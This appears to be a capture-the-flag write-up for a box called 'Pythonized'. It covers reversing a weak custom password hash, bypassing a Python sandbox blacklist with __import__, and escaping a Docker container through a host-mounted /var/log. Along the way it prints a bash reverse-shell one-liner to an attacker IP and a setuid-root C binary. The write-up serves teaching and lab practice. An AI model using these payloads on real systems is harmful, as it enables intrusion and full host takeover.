 Pythonized | Rooting Through Logic & Import Bypasses
💡 Overview

As the name hints, this box revolves around exploiting a custom Python-based logic to gain access and escalate privileges. Each stage of exploitation acts like a puzzle piece — once combined, they pave a direct path to root access. In this write-up, we'll dissect every layer of the box, from initial recon to post-exploitation.
📡 Reconnaissance

We begin with an nmap scan to uncover open ports:

nmap -sV -A <ip>

🔍 Results:

    Port 22: SSH

    Port 80: HTTP

The web service looks minimal. Clicking on Login or Sign up doesn't yield much — just a basic static interface.

However, every page ends with .html, so we run a gobuster scan with .html extensions:

gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x html

🕵️ We discover a juicy path: /admin.html.
🔑 Extracting Credentials via "Hash" Reversal

Inspecting the HTML + JS source reveals a custom password "hashing" function. But it’s not a true hash — it's reversible. The output is directly influenced by the input length and character position.

🔓 The issue: the hashing function doesn’t obfuscate input data, and the output length is a direct multiple of the input — making it trivial to reverse-engineer.

We write a Python script that maps ASCII characters against the hashing output to deduce the original string.

    ✅ Cracked Password: spaghetti1245
    👤 Username: connor

🎯 Gaining Access — or Not?

Using the creds on the login page redirects us to:

/super-secret-admin-testing-panel.html

Surprisingly, we realize this page is not protected — no cookie required. 🤯
💻 Remote Code Execution via Python Sandbox

This page contains a form that executes Python code server-side. We begin testing with basic inputs.

However:

    import, exec, and other functions are blacklisted.

    But the filter checks for "import " (with space) — not __import__.

💥 Bypass:

__import__('os').system('bash -i >& /dev/tcp/<IP>/1234 0>&1')

🎯 Reverse shell acquired — we’re root inside a Docker container.
🔁 SSH Access via Connor

Using the earlier credentials, we SSH into the host machine directly:

ssh connor@<ip>

We now have access outside the container, but not root.
🔧 Privilege Escalation via Docker Escape

Running linPEAS.sh inside the container, we find:

/var/log is mounted from the host

Since we’re root inside the container, we can manipulate files on the host's /var/log directory.

We craft a setuid-root binary and place it in /var/log:

// rootme.c
#include <stdlib.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash");
    return 0;
}

Compile & set permissions:

gcc rootme.c -o rootme
chmod +s rootme

Then execute it on the host via the SSH session:

./rootme

🔥 We are root on the host system.
🧩 Bonus: Sandbox Blacklist Logic

Reviewing the server-side filter logic shows this:

if "import " in input:
    block()

This poor pattern allows __import__('os') to bypass the check entirely.

Had the blacklist checked for "import" (no space), this could have been prevented. Lesson: blacklisting specific keywords is brittle and can be bypassed.
🏁 Final Thoughts

This box was a brilliant example of:

    Weak custom crypto logic

    Python sandbox escape

    Docker container privilege escalation via shared volumes
